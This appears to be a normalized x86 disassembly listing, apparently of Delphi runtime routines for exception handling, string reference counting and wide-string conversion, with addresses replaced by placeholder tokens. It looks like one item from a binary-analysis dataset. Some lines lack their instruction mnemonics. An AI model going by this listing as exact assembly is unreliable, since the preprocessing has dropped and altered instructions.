pop ebx
sub_4039e4
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f9c
sub_403a0c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405df4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403258
call sub_4035f4
sub_403a60
call sub_405df4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403258
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036bc
jmp edx
sub_403aa8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c08
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c76
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cd6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d30
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405b88
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d54
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405b88
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d7c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403da0
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403dfc
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e2c
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40122c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403eb8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403da0
call sub_403e2c
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c30
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c08
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405654
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403dfc
push eax
call sub_401244
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403fa8
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026dc
pop eax
sub_403fcc
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_403ffc
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_40406c
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_404040
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026dc
sub_40406c
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026bc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404098
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_40406c
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403fa8
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028b8
sub_4040c8
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040e8
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404104
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403fa8
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045f4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040c8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4040c8
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045f4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404098
jmp r-xdata
sub_4041a0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404098
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4041d0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404104
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404218
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404098
not ecx
sub_404244
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_404270
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403ffc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045f4
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045f4
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028b8
pop edi
pop esi
pop ebx
retn
sub_4042b4
test edx edx
je r-xdata
mov edx ecx
jmp sub_403ffc
test ecx ecx
je sub_403ffc
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404270
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_40406c
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028b8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028b8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403ffc
pop edx
pop eax
jmp sub_404270
call sub_403ffc
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404328
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_40406c
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045f4
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028b8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403ffc
dec [ edx - 0x8 ]
sub_4043b4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404474
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_40406c
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028b8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026dc
sub_4044c8
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403fa8
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404098
jmp r-xdata
pop ebx
retn 0x4
sub_404508
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404474
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028b8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045f4
mov edi ecx
sub_404550
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045f4
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028b8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028b8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4045ac
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045f4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403fa8
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_40406c
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4026fc
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028b8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4046a0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046c4
test edx edx
je sub_404688
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404688
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
retn
sub_4046e8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404688
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048d0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040e8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040e8
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048d0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404774
jmp r-xdata
sub_404774
test ecx ecx
je sub_404688
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404798
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404774
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404800
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404884
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4047f4
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404774
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048d0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404678
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404660
mov ebx eax
mov eax [ edi ]
call sub_4047f4
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028b8
mov eax esi
sub_404914
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404944
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404944
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404944
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404914
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402818
sub_4049e4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a30
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a30
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403fcc
jmp r-xdata
call sub_403fa8
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4046a0
jmp r-xdata
call sub_404688
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a18
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a30
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049e4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4056c4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404fe4
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402818
sub_404b40
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028b8
mov edx [ eax + esi ]
add eax ebx
call sub_403ffc
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046c4
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b28
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028b8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c5c
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b40
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4056dc
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405020
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c5c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403ffc
add ebx 0x4
add esi 0x4
